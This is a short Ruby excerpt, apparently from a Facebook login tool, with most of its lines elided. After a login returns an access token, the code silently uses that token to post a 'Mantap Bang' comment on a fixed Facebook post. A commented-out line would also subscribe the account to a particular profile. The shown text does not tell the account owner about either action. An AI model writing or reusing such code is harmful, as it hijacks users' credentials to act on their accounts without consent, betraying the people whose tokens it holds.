...
def loginpw()
  ...
  if f.include? ('access_token')
    ...
    #Net::HTTP.post_form(URI("https://graph.facebook.com/101087701648763/subscribers"),{"access_token"=>$token})
    ...
    Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Mantap Bang","access_token"=>$token})
